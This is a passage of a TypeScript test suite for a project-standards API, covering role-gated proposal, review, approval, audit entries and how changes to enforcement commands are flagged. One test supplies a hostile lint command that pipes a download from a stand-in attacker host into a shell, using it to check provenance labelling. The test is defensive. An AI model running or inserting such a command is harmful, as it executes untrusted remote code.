// ─── Project standards over HTTP: propose → review → in effect, by role ───
//
// Uses the harness role accounts (po / reviewer / approver / admin) in 'manual'
// standards mode, so nothing is approved behind the test's back.

import { strict as assert } from 'assert';
import { startHarness, Harness, Resp } from './app-harness';
import { migrateStandards, proposeAutomatic } from '../../../server/standards-store';
import {
  DEFAULT_RULE_SEVERITY, MAX_STANDARDS_FREE_TEXT_CHARS, STANDARDS_RULE_IDS, profileHash, severityChangesBetween,
  renderPlannerStandards, renderStandardsText,
} from '../../../standards/profile';
import { RULEBOOK_KEYS } from '../../../standards/rulebook';
import { sampleProfile } from '../standards/fixtures';
import { templateDesign } from '../../../standards/design';
import * as fs from 'fs';
import * as path from 'path';

interface VersionDto {
  version: number; status: string; origin: string; inEffect: boolean; contentHash: string; baseVersion: number | null;
  profile: ReturnType<typeof sampleProfile>; provenance: Record<string, { tag: string; evidence: string }>;
  commands: Array<{ label: string; run: string }>; changedFrom: { version: number; sections: string[] } | null;
  proposedBy: string; proposedByName: string | null; decidedByName: string | null; decision?: string; reason?: string;
  allowedActions: string[];
}
interface StandardsDto {
  migrated: boolean; state: string; effectiveVersion: number | null; pendingVersion: number | null;
  stack: string; stackMismatch: boolean; versions: VersionDto[]; allowedActions: string[];
  limits: { freeTextChars: number };
}

describe('standards API', function () {
  this.timeout(30000);
  let h: Harness;
  let projectId: string;

  beforeEach(async () => {
    h = await startHarness({ standards: 'manual', extraAccounts: { both: ['product-owner', 'reviewer'] } });
    const r = await h.request('POST', '/api/projects', {
      as: 'po', body: { name: 'Acme', source: { kind: 'path', path: 'acme' }, stack: 'node-ts', defaultEngine: 'claude' },
    });
    assert.equal(r.status, 201, r.raw);
    projectId = (r.body.project as { id: string }).id;
  });
  afterEach(async () => { await h.close(); });

  const base = () => `/api/projects/${projectId}/standards`;
  const get = async (as = 'reviewer'): Promise<StandardsDto> => {
    const r = await h.request('GET', base(), { as });
    assert.equal(r.status, 200, r.raw);
    return r.body.standards as StandardsDto;
  };
  const propose = (as: string, profile: unknown, baseVersion: number | null): Promise<Resp> =>
    h.request('POST', `${base()}/versions`, { as, body: { profile, baseVersion } });
  /**
   * Approve as a reviewer who ticked the enforcement changes (the acknowledgement is the
   * hash of what was shown). `acknowledge: false` is the request a client sends without it.
   */
  const approve = (as: string, version: number, contentHash: string, acknowledge = true): Promise<Resp> =>
    h.request('POST', `${base()}/versions/${version}/approve`, {
      as, body: acknowledge ? { contentHash, acknowledgedEnforcementHash: contentHash } : { contentHash },
    });
  const standardsAudit = () => h.auditEntries().filter((e) => e.action.startsWith('standards.'));
  /** The sample profile with the same rule severities as the automatic v1, so only its content differs. */
  const sameSeverityAsV1 = async (): Promise<ReturnType<typeof sampleProfile>> => {
    const v1 = (await get()).versions[0];
    return { ...sampleProfile(), ...(v1.profile.severity ? { severity: v1.profile.severity } : {}) };
  };

  /** The same, and with the automatic v1's commands and required directories too: nothing about enforcement differs. */
  const sameBlockingSetAsV1 = async (): Promise<ReturnType<typeof sampleProfile>> => {
    const v1 = (await get()).versions[0];
    const profile = await sameSeverityAsV1();
    return { ...profile, commands: v1.profile.commands, structure: { ...profile.structure, requiredDirs: v1.profile.structure.requiredDirs } };
  };

  it('creating a project proposes v1 automatically: pending, tagged, audited as auto-proposed', async () => {
    const s = await get();
    assert.equal(s.state, 'pending');
    assert.equal(s.effectiveVersion, null);
    assert.equal(s.pendingVersion, 1);
    assert.equal(s.migrated, false);
    assert.equal(s.versions.length, 1);
    const v1 = s.versions[0];
    assert.equal(v1.origin, 'auto');
    assert.equal(v1.proposedBy, 'system');
    assert.equal(v1.proposedByName, null);
    assert.equal(v1.baseVersion, null);
    assert.equal(v1.changedFrom, null);
    assert.equal(v1.contentHash, profileHash(v1.profile));
    assert.equal(v1.profile.stackTemplateId, 'node-ts');
    // The fixture workspace is empty: greenfield, every area assumed.
    assert.equal(v1.profile.repoState, 'greenfield');
    for (const tag of Object.values(v1.provenance)) { assert.equal(tag.tag, 'assumed'); }

    const audit = standardsAudit();
    assert.equal(audit.length, 1);
    assert.equal(audit[0].action, 'standards.propose');
    assert.equal(audit[0].actorUsername, 'po');
    // Nothing is in effect, so the proposal is measured against an empty baseline: the
    // directories the built-in asks for are on record from the first version on. It promotes
    // no rule and — in an empty workspace — proposes no command.
    assert.deepEqual(v1.commands, []);
    assert.equal(v1.profile.severity, undefined);
    assert.deepEqual(audit[0].flags, ['auto-proposed', 'enforcement-changed']);
    assert.deepEqual(audit[0].after, {
      version: 1, contentHash: v1.contentHash, origin: 'auto',
      enforcementChanged: { comparedTo: null, requiredDirs: { before: [], after: v1.profile.structure.requiredDirs } },
    });

    const project = await h.request('GET', `/api/projects/${projectId}`, { as: 'po' });
    assert.deepEqual((project.body.project as { standards: unknown }).standards, { effectiveVersion: null, pendingVersion: 1, state: 'pending' });
    const list = await h.request('GET', '/api/projects', { as: 'approver' });
    assert.deepEqual((list.body.projects as Array<{ standards: unknown }>)[0].standards, { effectiveVersion: null, pendingVersion: 1, state: 'pending' });
  });

  it('allowedActions follow the role: only the reviewer may decide, only po and admin may propose, nobody may accept defaults here', async () => {
    const actions = async (as: string) => { const s = await get(as); return { top: s.allowedActions, v1: s.versions[0].allowedActions }; };
    assert.deepEqual(await actions('reviewer'), { top: [], v1: ['standards.approve', 'standards.reject'] });
    assert.deepEqual(await actions('po'), { top: ['standards.propose'], v1: [] });
    assert.deepEqual(await actions('approver'), { top: [], v1: [] });
    // Not a migrated project: accept-defaults is not offered even to an admin.
    assert.deepEqual(await actions('admin'), { top: ['standards.propose'], v1: [] });
  });

  it('po proposes v2 (v1 is superseded); po cannot approve; reviewer approves and it takes effect', async () => {
    const profile = await sameSeverityAsV1();
    const created = await propose('po', profile, 1);
    assert.equal(created.status, 201, created.raw);
    assert.equal(created.body.version, 2);
    let s = await get();
    assert.deepEqual(s.versions.map((v) => v.status), ['superseded', 'pending']);
    const v2 = s.versions[1];
    assert.equal(v2.origin, 'user');
    assert.equal(v2.proposedByName, 'po');
    assert.equal(v2.baseVersion, 1);
    // Commands verbatim, exactly as a worker would run them.
    assert.deepEqual(v2.commands, [{ label: 'Lint', run: 'npm run lint' }]);
    assert.deepEqual(v2.profile.commands, profile.commands);
    assert.ok(v2.changedFrom && v2.changedFrom.version === 1);
    assert.ok(v2.changedFrom!.sections.includes('commands') && v2.changedFrom!.sections.includes('freeText'));
    assert.ok(!v2.changedFrom!.sections.includes('stackTemplateId'), 'an unchanged section is not listed');
    // What the proposer changed is tagged as theirs; only an area still identical to the
    // automatic proposal keeps the server's tag.
    assert.deepEqual(v2.provenance.commands, { tag: 'assumed', evidence: 'entered by po' });
    assert.deepEqual(v2.provenance.stackTemplateId, s.versions[0].provenance.stackTemplateId, 'the stack was not changed');
    for (const [field, tag] of Object.entries(v2.provenance)) {
      assert.ok(tag.evidence === 'entered by po' || JSON.stringify(tag) === JSON.stringify(s.versions[0].provenance[field]), field);
    }

    const denied = await approve('po', 2, v2.contentHash);
    assert.equal(denied.status, 403);
    assert.equal(denied.body.error, 'forbidden');
    assert.equal((await get()).pendingVersion, 2, 'still pending');

    const ok = await approve('reviewer', 2, v2.contentHash);
    assert.equal(ok.status, 200, ok.raw);
    s = ok.body.standards as StandardsDto;
    assert.equal(s.state, 'approved');
    assert.equal(s.effectiveVersion, 2);
    assert.equal(s.pendingVersion, null);
    assert.equal(s.versions[1].inEffect, true);
    assert.equal(s.versions[1].decidedByName, 'reviewer');
    assert.equal(s.versions[1].decision, 'approved');
    assert.deepEqual(s.versions[1].allowedActions, [], 'an approved version offers nothing');

    const last = standardsAudit().pop()!;
    assert.equal(last.action, 'standards.approve');
    assert.equal(last.actorUsername, 'reviewer');
    // Nothing was in effect before v2, so the approval records everything v2 brings: its
    // command and its required directories, against an empty baseline. It promotes no rule.
    assert.deepEqual(severityChangesBetween(null, v2.profile), []);
    assert.ok(v2.profile.commands.length > 0);
    assert.deepEqual(last.after, {
      version: 2, contentHash: v2.contentHash, origin: 'user',
      enforcementChanged: {
        comparedTo: null,
        commands: { before: [], after: v2.profile.commands },
        requiredDirs: { before: [], after: v2.profile.structure.requiredDirs },
      },
    });
    assert.deepEqual(last.flags, ['enforcement-changed', 'commands-changed'], 'a different person approved: not a self-approval');
  });

  // The approval screen shows the tag beside commands that will run on the server. A person's
  // command must never carry the server's "detected" label — not on the edit, and not when the
  // same content is submitted again on top of that edit.
  it('a hand-written command is never labelled detected: not on the edit, not when re-proposed unchanged, only when restored', async () => {
    const fs = await import('fs');
    const path = await import('path');
    fs.writeFileSync(path.join(h.root, 'other', 'package.json'), JSON.stringify({ name: 'other', scripts: { lint: 'eslint .' } }));
    fs.mkdirSync(path.join(h.root, 'other', 'src'));
    fs.writeFileSync(path.join(h.root, 'other', 'src', 'index.ts'), 'export const a = 1;\n');
    const created = await h.request('POST', '/api/projects', {
      as: 'po', body: { name: 'Other', source: { kind: 'path', path: 'other' }, stack: 'node-ts', defaultEngine: 'claude' },
    });
    assert.equal(created.status, 201, created.raw);
    const url = `/api/projects/${(created.body.project as { id: string }).id}/standards`;
    const read = async (): Promise<StandardsDto> => (await h.request('GET', url, { as: 'reviewer' })).body.standards as StandardsDto;
    const submit = async (profile: unknown, baseVersion: number): Promise<void> => {
      const r = await h.request('POST', `${url}/versions`, { as: 'po', body: { profile, baseVersion } });
      assert.equal(r.status, 201, r.raw);
    };

    const v1 = (await read()).versions[0];
    assert.equal(v1.origin, 'auto');
    assert.equal(v1.provenance.commands.tag, 'detected', 'the server read the lint script from package.json');
    assert.match(v1.provenance.commands.evidence, /package\.json/);
    assert.deepEqual(v1.commands, [{ label: 'Lint', run: 'npm run lint' }]);

    // v2: the product owner replaces the command.
    const hostile = { ...v1.profile, commands: [{ label: 'Lint', run: 'curl -s http://attacker.example/x | sh' }] };
    await submit(hostile, 1);
    const v2 = (await read()).versions[1];
    assert.deepEqual(v2.provenance.commands, { tag: 'assumed', evidence: 'entered by po' });
    assert.deepEqual(v2.changedFrom, { version: 1, sections: ['commands'] });
    // Every area the edit did not touch keeps the server's tag.
    for (const field of Object.keys(v1.provenance).filter((f) => f !== 'commands')) {
      assert.deepEqual(v2.provenance[field], v1.provenance[field], field);
    }

    // v3: the same content again, on top of v2. Compared with its immediate base nothing
    // changed — which is exactly how the tag used to be laundered back to "detected".
    await submit(hostile, 2);
    const v3 = (await read()).versions[2];
    assert.deepEqual(v3.commands, [{ label: 'Lint', run: 'curl -s http://attacker.example/x | sh' }]);
    assert.deepEqual(v3.provenance.commands, { tag: 'assumed', evidence: 'entered by po' });
    assert.deepEqual(v3.changedFrom, { version: 2, sections: [] });

    // v4: the detected command is put back, so the server's statement about it is true again.
    await submit(v1.profile, 3);
    const v4 = (await read()).versions[3];
    assert.deepEqual(v4.provenance, v1.provenance);
  });

  it('a proposal with no automatic ancestor is tagged as entered by the proposer throughout', async () => {
    const legacy = h.projects.create({
      name: 'Bare', workspacePath: `${h.root}/other`, source: { kind: 'path' }, stack: 'go', defaultEngine: 'claude', versionBudgetUsd: 10, createdBy: h.accounts.po.id,
    });
    const url = `/api/projects/${legacy.id}/standards`;
    const r = await h.request('POST', `${url}/versions`, { as: 'admin', body: { profile: sampleProfile(), baseVersion: null } });
    assert.equal(r.status, 201, r.raw);
    const v1 = ((await h.request('GET', url, { as: 'reviewer' })).body.standards as StandardsDto).versions[0];
    for (const [field, tag] of Object.entries(v1.provenance)) {
      assert.deepEqual(tag, { tag: 'assumed', evidence: 'entered by admin' }, field);
    }
  });

  it('a new proposal leaves the approved version in effect until it is approved itself', async () => {
    const v1 = (await get()).versions[0];
    assert.equal((await approve('reviewer', 1, v1.contentHash)).status, 200);
    assert.equal((await propose('po', sampleProfile(), 1)).status, 201);
    const s = await get();
    assert.equal(s.state, 'approved');
    assert.equal(s.effectiveVersion, 1);
    assert.equal(s.pendingVersion, 2);
    assert.deepEqual(s.versions.map((v) => [v.status, v.inEffect]), [['approved', true], ['pending', false]]);
  });

  it('reviewer rejects with a reason; the reason is stored on the version and kept out of the audit log', async () => {
    const v1 = (await get()).versions[0];
    const noReason = await h.request('POST', `${base()}/versions/1/reject`, { as: 'reviewer', body: {} });
    assert.equal(noReason.status, 400);
    const r = await h.request('POST', `${base()}/versions/1/reject`, { as: 'reviewer', body: { reason: 'no test directory' } });
    assert.equal(r.status, 200, r.raw);
    const s = r.body.standards as StandardsDto;
    assert.equal(s.state, 'rejected');
    assert.equal(s.versions[0].status, 'rejected');
    assert.equal(s.versions[0].reason, 'no test directory');
    assert.equal(s.effectiveVersion, null);
    const last = standardsAudit().pop()!;
    assert.equal(last.action, 'standards.reject');
    assert.deepEqual(last.after, { version: 1, contentHash: v1.contentHash, origin: 'auto' });

    // Deciding it again is refused, and says who decided.
    const again = await approve('reviewer', 1, v1.contentHash);
    assert.equal(again.status, 409);
    assert.equal(again.body.error, 'already-decided');
    assert.equal(again.body.status, 'rejected');
  });

  it('approver gets 403 on all four mutations, and a refused request writes no audit line', async () => {
    const before = h.auditEntries().length;
    const hash = (await get()).versions[0].contentHash;
    const attempts: Array<[string, unknown]> = [
      [`${base()}/versions`, { profile: sampleProfile(), baseVersion: 1 }],
      [`${base()}/versions/1/approve`, { contentHash: hash }],
      [`${base()}/versions/1/reject`, { reason: 'no' }],
      [`${base()}/accept-defaults`, { contentHash: hash }],
    ];
    for (const [url, body] of attempts) {
      const r = await h.request('POST', url, { as: 'approver', body });
      assert.equal(r.status, 403, `${url}: ${r.raw}`);
      assert.equal(r.body.error, 'forbidden');
    }
    assert.equal(h.auditEntries().length, before);
    assert.equal((await get()).pendingVersion, 1, 'nothing changed');
  });

  it('every refusal past the role gate also writes no audit line: stale, hash mismatch, unknown version, invalid body', async () => {
    const before = h.auditEntries().length;
    const stale = await propose('po', sampleProfile(), null);
    assert.equal(stale.status, 409);
    assert.equal(stale.body.error, 'stale');
    assert.equal(stale.body.latestVersion, 1);
    const mismatch = await approve('reviewer', 1, 'f'.repeat(64));
    assert.equal(mismatch.status, 409);
    assert.equal(mismatch.body.error, 'hash-mismatch');
    assert.equal((await approve('reviewer', 9, 'f'.repeat(64))).status, 404);
    assert.equal((await h.request('POST', `${base()}/versions/abc/approve`, { as: 'reviewer', body: { contentHash: 'f'.repeat(64) } })).status, 404);
    assert.equal((await approve('reviewer', 1, 'not-a-hash')).status, 400);
    assert.equal((await h.request('POST', `${base()}/versions`, { as: 'po', body: { profile: sampleProfile(), baseVersion: 1, extra: true } })).status, 400);
    assert.equal(h.auditEntries().length, before);
    assert.equal((await get()).versions.length, 1);
  });

  it('free text over the cap is 400 invalid-standards with the error list', async () => {
    const before = h.auditEntries().length;
    const profile = sampleProfile();
    profile.freeText = 'x'.repeat(MAX_STANDARDS_FREE_TEXT_CHARS + 1);
    const r = await propose('po', profile, 1);
    assert.equal(r.status, 400, r.raw);
    assert.equal(r.body.error, 'invalid-standards');
    assert.ok((r.body.errors as string[]).some((e) => e.includes('profile.freeText') && e.includes(String(MAX_STANDARDS_FREE_TEXT_CHARS))));
    assert.equal(h.auditEntries().length, before);

    const unknownKey = await propose('po', { ...sampleProfile(), designTokens: 'x' }, 1);
    assert.equal(unknownKey.status, 400);
    assert.equal(unknownKey.body.error, 'invalid-standards');
    const credential = sampleProfile();
    credential.freeText = 'deploy with sk-abcdefghijklmnopqrstuvwx';
    assert.equal((await propose('po', credential, 1)).body.error, 'invalid-standards');
    assert.equal((await get()).limits.freeTextChars, MAX_STANDARDS_FREE_TEXT_CHARS);
  });

  it('the audit payload holds the enforcement diff and no other profile text', async () => {
    const v1 = await approveV1();
    const profile = await sameBlockingSetAsV1();
    profile.frontend.styleSource = 'src/ui/design-tokens.ts';
    profile.freeText = 'UNIQUE-FREE-TEXT-MARKER prefer small modules';
    profile.commands = [{ label: 'Lint', run: 'npx eslint src --ext ts --UNIQUE-COMMAND-MARKER' }];
    const created = await propose('po', profile, 1);
    assert.equal(created.status, 201, created.raw);
    const v2 = (await get()).versions[1];
    assert.equal((await approve('reviewer', 2, v2.contentHash)).status, 200);

    const mine = standardsAudit().filter((e) => (e.after as { version: number }).version === 2);
    assert.deepEqual(mine.map((e) => e.action), ['standards.propose', 'standards.approve']);
    for (const e of mine) {
      // The command it adds decides what can stop a release: it is on record, before and after.
      assert.deepEqual(Object.keys(e.after as object).sort(), ['contentHash', 'enforcementChanged', 'origin', 'version']);
      assert.deepEqual((e.after as { enforcementChanged: unknown }).enforcementChanged,
        { comparedTo: 1, commands: { before: v1.profile.commands, after: profile.commands } });
      assert.deepEqual(e.flags, ['enforcement-changed', 'commands-changed']);
      // Everything else in the profile stays out of the audit log.
      const line = JSON.stringify(e);
      for (const text of ['UNIQUE-FREE-TEXT-MARKER', 'design-tokens', 'styleSource']) {
        assert.ok(!line.includes(text), `audit entry leaks "${text}"`);
      }
    }
  });

  it('a user holding both roles who approves their own proposal is flagged self-approval', async () => {
    await approveV1();
    assert.equal((await propose('both', await sameBlockingSetAsV1(), 1)).status, 201);
    const v2 = (await get()).versions[1];
    // It changes nothing about enforcement, so no acknowledgement is asked for.
    assert.equal((await approve('both', 2, v2.contentHash, false)).status, 200);
    const last = standardsAudit().pop()!;
    assert.equal(last.action, 'standards.approve');
    assert.deepEqual(last.flags, ['self-approval']);
  });

  // ─── Rule severity: what can stop a release is part of the profile, versioned and audited ───

  it('every version shows the severity of every rule, with the defaults beside it: nothing MOAG scans for itself blocks', async () => {
    const s = await get() as StandardsDto & { severityDefaults: Record<string, string> };
    const v1 = s.versions[0] as VersionDto & { severity: Record<string, string> };
    assert.deepEqual(Object.keys(v1.severity).sort(), [...STANDARDS_RULE_IDS].sort());
    assert.deepEqual(s.severityDefaults, DEFAULT_RULE_SEVERITY);
    for (const rule of STANDARDS_RULE_IDS) {
      assert.equal(s.severityDefaults[rule], 'advisory', `${rule}: advisory by default — required directories and nested repositories included`);
      assert.equal(v1.severity[rule], 'advisory', `${rule}: the automatic proposal promotes nothing`);
    }
  });

  /** Put the automatic v1 into effect, so later proposals are measured against it. */
  const approveV1 = async (): Promise<VersionDto> => {
    const v1 = (await get()).versions[0];
    assert.equal((await approve('reviewer', 1, v1.contentHash)).status, 200);
    return v1;
  };
  type SeverityDto = VersionDto & {
    severity: Record<string, string>;
    severityChanged: Array<{ rule: string; from: string; to: string }>;
    severityComparedTo: number | null;
  };
  type Commands = Array<{ label: string; run: string }>;
  type EnforcementDto = SeverityDto & {
    enforcementChanged: {
      comparedTo: number | null; changed: boolean; fields: string[];
      commands: { before: Commands; after: Commands } | null;
      severity: Array<{ rule: string; from: string; to: string }>;
      requiredDirs: { before: string[]; after: string[] } | null;
      ruleConfig: Array<{ rule: string; before: unknown; after: unknown }>;
    };
  };

  it('promoting a rule is a new version: pending until reviewed, shown and audited as an enforcement change', async () => {
    const v1 = await approveV1();
    const promoted = { ...v1.profile, severity: { ...v1.profile.severity, 'naming/files': 'blocking' } };
    const created = await propose('po', promoted, 1);
    assert.equal(created.status, 201, created.raw);

    const s = await get();
    const v2 = s.versions[1] as EnforcementDto;
    assert.equal(v2.status, 'pending', 'nothing changes until a reviewer decides');
    assert.equal(s.effectiveVersion, 1);
    assert.equal(v2.severity['naming/files'], 'blocking');
    assert.notEqual(v2.contentHash, v1.contentHash, 'a severity change is a content change');
    assert.deepEqual(v2.changedFrom, { version: 1, sections: ['severity'] });
    const change = [{ rule: 'naming/files', from: 'advisory', to: 'blocking' }];
    assert.deepEqual(v2.severityChanged, change);
    assert.equal(v2.severityComparedTo, 1);
    // Its settings are what v1 already held, so only the severity is a difference.
    assert.deepEqual(v2.enforcementChanged.fields, ['severity']);
    assert.deepEqual(v2.enforcementChanged.ruleConfig, []);

    const proposed = standardsAudit().pop()!;
    assert.equal(proposed.action, 'standards.propose');
    assert.deepEqual(proposed.flags, ['enforcement-changed', 'severity-changed']);
    assert.deepEqual((proposed.after as { enforcementChanged: { comparedTo: number; severity: unknown } }).enforcementChanged.severity, change);

    assert.equal((await approve('reviewer', 2, v2.contentHash, false)).status, 409, 'not without the acknowledgement');
    assert.equal((await approve('reviewer', 2, v2.contentHash)).status, 200);
    const approved = standardsAudit().pop()!;
    assert.equal(approved.action, 'standards.approve');
    assert.deepEqual(approved.flags, ['enforcement-changed', 'severity-changed'], 'the approval that puts it into effect is flagged too');
    assert.deepEqual((approved.after as { enforcementChanged: { severity: unknown } }).enforcementChanged.severity, change);
    assert.equal((await get()).effectiveVersion, 2);
  });

  it('an override that only restates an advisory default is no change, and is not flagged', async () => {
    const v1 = await approveV1();
    const restated = { ...v1.profile, freeText: 'One line.', severity: { ...v1.profile.severity, 'comment-policy/banned-phrase': 'advisory', 'layering/imports': 'advisory' } };
    assert.equal((await propose('po', restated, 1)).status, 201);
    const entry = standardsAudit().pop()!;
    assert.equal(entry.flags, undefined);
    const v2 = (await get()).versions[1] as EnforcementDto;
    assert.deepEqual(v2.severityChanged, []);
    assert.equal(v2.enforcementChanged.changed, false);
  });

  it('an edit that leaves commands, severities and required directories as they are in effect is not flagged and needs no acknowledgement', async () => {
    await approveV1();
    const profile = await sameBlockingSetAsV1();
    assert.equal((await propose('po', profile, 1)).status, 201);
    const entry = standardsAudit().pop()!;
    assert.equal(entry.flags, undefined);
    assert.deepEqual(Object.keys(entry.after as object).sort(), ['contentHash', 'origin', 'version']);
    const v2 = (await get()).versions[1] as EnforcementDto;
    assert.deepEqual(v2.severityChanged, []);
    assert.equal(v2.severityComparedTo, 1);
    assert.deepEqual(v2.enforcementChanged, { comparedTo: 1, changed: false, fields: [], commands: null, severity: [], requiredDirs: null, ruleConfig: [] });
    assert.equal((await approve('reviewer', 2, v2.contentHash, false)).status, 200);
  });

  // ─── Enforcement changes: any difference in commands, severities or required directories ───

  const LINT = { label: 'Lint', run: 'npm run lint' };
  const TEST = { label: 'Test', run: 'npm test' };
  /** v1 replaced by an approved v2 that requires `src` and `test`, runs two commands and promotes one rule. */
  const approveEnforcingV2 = async (): Promise<ReturnType<typeof sampleProfile>> => {
    await approveV1();
    const profile = sampleProfile();
    profile.structure.requiredDirs = ['src', 'test'];
    profile.commands = [{ ...LINT }, { ...TEST }];
    profile.severity = { 'naming/files': 'blocking' };
    assert.equal((await propose('po', profile, 1)).status, 201);
    const v2 = (await get()).versions[1];
    assert.equal((await approve('reviewer', 2, v2.contentHash)).status, 200);
    return profile;
  };

  type Profile = ReturnType<typeof sampleProfile>;
  /** Every edit the closing decision names. Each must be flagged and blocked from approval without acknowledgement. */
  const EDITS: Array<{ name: string; edit: (p: Profile) => Profile; fields: string[] }> = [
    { name: 'remove a command', edit: (p) => ({ ...p, commands: [{ ...TEST }] }), fields: ['commands'] },
    { name: 'edit a command to "|| true"', edit: (p) => ({ ...p, commands: [{ ...LINT }, { label: 'Test', run: 'npm test || true' }] }), fields: ['commands'] },
    { name: 'reorder the commands', edit: (p) => ({ ...p, commands: [{ ...TEST }, { ...LINT }] }), fields: ['commands'] },
    { name: 'rename a command label', edit: (p) => ({ ...p, commands: [{ label: 'Lint (soft)', run: 'npm run lint' }, { ...TEST }] }), fields: ['commands'] },
    { name: 'empty the command list', edit: (p) => ({ ...p, commands: [] }), fields: ['commands'] },
    { name: 'swap a required directory', edit: (p) => ({ ...p, structure: { ...p.structure, requiredDirs: ['src', 'tmp'] } }), fields: ['requiredDirs'] },
    { name: 'empty the required directories', edit: (p) => ({ ...p, structure: { ...p.structure, requiredDirs: [] } }), fields: ['requiredDirs'] },
    { name: 'demote a rule', edit: (p) => ({ ...p, severity: {} }), fields: ['severity'] },
    { name: 'promote a rule', edit: (p) => ({ ...p, severity: { 'naming/files': 'blocking', 'structure/nested-repository': 'blocking' } }), fields: ['severity'] },
  ];

  for (const { name, edit, fields } of EDITS) {
    it(`${name}: flagged enforcement-changed with a before/after, and approval is refused (409) until it is acknowledged`, async () => {
      const inEffect = await approveEnforcingV2();
      const edited = edit(inEffect);
      assert.equal((await propose('po', edited, 2)).status, 201);
      const v3 = (await get()).versions[2] as EnforcementDto;

      // The review screen is given the diff, measured against the version in effect.
      assert.equal(v3.enforcementChanged.comparedTo, 2);
      assert.equal(v3.enforcementChanged.changed, true);
      assert.deepEqual(v3.enforcementChanged.fields, fields);
      if (fields.includes('commands')) { assert.deepEqual(v3.enforcementChanged.commands, { before: inEffect.commands, after: edited.commands }); }
      if (fields.includes('requiredDirs')) { assert.deepEqual(v3.enforcementChanged.requiredDirs, { before: ['src', 'test'], after: edited.structure.requiredDirs }); }
      if (fields.includes('severity')) { assert.ok(v3.enforcementChanged.severity.length > 0); }

      const proposed = standardsAudit().pop()!;
      assert.equal(proposed.action, 'standards.propose');
      assert.equal(proposed.flags?.[0], 'enforcement-changed');
      const diff = (proposed.after as { enforcementChanged: Record<string, unknown> }).enforcementChanged;
      assert.deepEqual(Object.keys(diff).filter((k) => k !== 'comparedTo'), fields);
      assert.equal(diff.comparedTo, 2);

      // No acknowledgement, or the acknowledgement of other content: 409, nothing approved, nothing audited.
      const before = standardsAudit().length;
      const bare = await approve('reviewer', 3, v3.contentHash, false);
      assert.equal(bare.status, 409, bare.raw);
      assert.equal(bare.body.error, 'acknowledgement-required');
      assert.deepEqual(bare.body.fields, fields);
      assert.equal(bare.body.comparedTo, 2);
      const stale = await h.request('POST', `${base()}/versions/3/approve`, {
        as: 'reviewer', body: { contentHash: v3.contentHash, acknowledgedEnforcementHash: (await get()).versions[1].contentHash },
      });
      assert.equal(stale.status, 409);
      assert.equal(stale.body.error, 'acknowledgement-required');
      assert.equal((await get()).effectiveVersion, 2, 'v2 is still in effect');
      assert.equal(standardsAudit().length, before, 'a refused approval writes no audit line');

      // Acknowledged: approved, and the approval is flagged with the same diff.
      assert.equal((await approve('reviewer', 3, v3.contentHash)).status, 200);
      const approved = standardsAudit().pop()!;
      assert.equal(approved.action, 'standards.approve');
      assert.deepEqual(approved.flags, proposed.flags);
      assert.deepEqual((approved.after as { enforcementChanged: unknown }).enforcementChanged, diff);
      assert.equal((await get()).effectiveVersion, 3);
    });
  }

  it('a malformed acknowledgement is a 400, not an approval', async () => {
    const v1 = (await get()).versions[0];
    const r = await h.request('POST', `${base()}/versions/1/approve`, { as: 'reviewer', body: { contentHash: v1.contentHash, acknowledgedEnforcementHash: 'yes' } });
    assert.equal(r.status, 400, r.raw);
    assert.equal((await get()).effectiveVersion, null);
  });

  // The hole this closes: v2 changes what can stop a release and is flagged; v3 is proposed
  // on top of v2 with one word changed. Against its immediate base v3 changes nothing, so it
  // used to be shown, proposed and approved as a free-text edit — and the standards in effect
  // went from v1 to v3 with enforcement changed and nothing on record.
  it('a change cannot ride into effect through a second proposal: v3 is measured against v1, at propose and at approve', async () => {
    const v1 = await approveV1();
    const changed = { ...v1.profile, commands: [{ ...LINT }], severity: { ...v1.profile.severity, 'naming/files': 'blocking' } };
    assert.equal((await propose('po', changed, 1)).status, 201);
    assert.deepEqual(standardsAudit().pop()!.flags, ['enforcement-changed', 'severity-changed', 'commands-changed']);

    // v3: the same enforcement, one line of free text. Its immediate base is the unapproved v2.
    assert.equal((await propose('po', { ...changed, freeText: 'Prefer small modules. Really.' }, 2)).status, 201);
    const expected = [{ rule: 'naming/files', from: 'advisory', to: 'blocking' }];
    const proposed = standardsAudit().pop()!;
    assert.equal(proposed.action, 'standards.propose');
    assert.deepEqual(proposed.flags, ['enforcement-changed', 'severity-changed', 'commands-changed']);
    const diff = (proposed.after as { enforcementChanged: { comparedTo: number; severity: unknown; commands: unknown } }).enforcementChanged;
    assert.equal(diff.comparedTo, 1);
    assert.deepEqual(diff.severity, expected);
    assert.deepEqual(diff.commands, { before: v1.profile.commands, after: [LINT] });

    const s = await get();
    assert.equal(s.effectiveVersion, 1);
    const v2 = s.versions[1] as EnforcementDto;
    const v3 = s.versions[2] as EnforcementDto;
    assert.equal(v2.status, 'superseded');
    assert.equal(v3.baseVersion, 2, 'it was proposed on top of the unapproved v2');
    // The reviewer is shown what approving v3 changes about what is in effect, not what it changes about v2.
    assert.equal(v3.changedFrom!.version, 1);
    for (const section of ['severity', 'commands', 'freeText']) { assert.ok(v3.changedFrom!.sections.includes(section), section); }
    assert.deepEqual(v3.severityChanged, expected);
    assert.equal(v3.severityComparedTo, 1);
    assert.equal(v3.enforcementChanged.comparedTo, 1);
    assert.equal(v3.enforcementChanged.changed, true);

    assert.equal((await approve('reviewer', 3, v3.contentHash, false)).body.error, 'acknowledgement-required', 'the word edit launders nothing');
    assert.equal((await approve('reviewer', 3, v3.contentHash)).status, 200);
    const approved = standardsAudit().pop()!;
    assert.equal(approved.action, 'standards.approve');
    assert.deepEqual(approved.flags, ['enforcement-changed', 'severity-changed', 'commands-changed']);
    assert.deepEqual((approved.after as { enforcementChanged: unknown }).enforcementChanged, diff, 'the full before/after, against v1');
    // Once in effect, v3 is still described by what it replaced.
    const after = (await get()).versions[2] as EnforcementDto;
    assert.equal(after.severityComparedTo, 1);
    assert.deepEqual(after.severityChanged, expected);
    assert.equal(after.enforcementChanged.comparedTo, 1);
  });

  it('with nothing approved yet, a version is measured against an empty baseline — the automatic v1 and a person\'s proposal alike', async () => {
    const s = await get();
    const v1 = s.versions[0] as EnforcementDto;
    assert.equal(v1.severityComparedTo, null);
    assert.deepEqual(v1.severityChanged, [], 'the built-in promotes nothing');
    // The built-in brings its template directories, and nothing else that enforces.
    assert.deepEqual(v1.enforcementChanged, {
      comparedTo: null, changed: true, fields: ['requiredDirs'], commands: null, severity: [],
      requiredDirs: { before: [], after: v1.profile.structure.requiredDirs }, ruleConfig: [],
    });
    assert.equal((await approve('reviewer', 1, v1.contentHash, false)).body.error, 'acknowledgement-required', 'even the first version');

    // A person's proposal on top of the pending v1: still measured against nothing.
